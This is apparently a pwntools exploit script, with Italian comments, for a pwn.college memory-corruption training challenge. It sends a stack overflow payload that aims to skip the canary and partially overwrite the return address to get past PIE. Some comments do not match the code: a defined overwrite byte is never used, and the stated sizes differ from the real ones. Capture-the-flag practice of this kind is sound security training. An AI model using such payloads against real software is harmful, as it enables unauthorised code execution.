#!/usr/bin/python3
from pwn import *

elf = ELF("/challenge/babymem-level-9-0")
p = elf.process()

# Buffer di input
buffer_size = 56
padding_size = 1 # Padding fino alla return address (88 byte)

# Sovrascrive `n` con 96 (0x60) per saltare oltre il canary
n_overwrite = b"\x41"  # n = 96 (0x60) in Little Endian

# Ultimi 2 byte della return address (da modificare per PIE)
return_address_overwrite = b"\x40\x15"  # Modifica questi 2 byte per l'indirizzo corretto

# Creazione del payload
payload = b'A' * buffer_size   # Riempie il buffe         # Sovrascrive `n` con il valore per saltare il canary
payload += b'\x57' * padding_size # Padding fino alla return address
payload += return_address_overwrite  # Modifica gli ultimi 2 byte della return address

# Stampa la dimensione del payload
print(f"Payload size: {len(payload)}")  # Per debuggingq

#while True:
# Invia la lunghezza del payload
    #p = elf.process()
p.sendline(b"90")  # Assicura che il valore sia corretto

# Invia il payload
p.sendline(payload)
    #p.recvuntil(b"Goodbye!")
    #flag = p.recvall().decode()
    #if 'pwn.college' in flag:
    #    print(flag)
    #    break
# Interagisci con il programma
p.interactive()
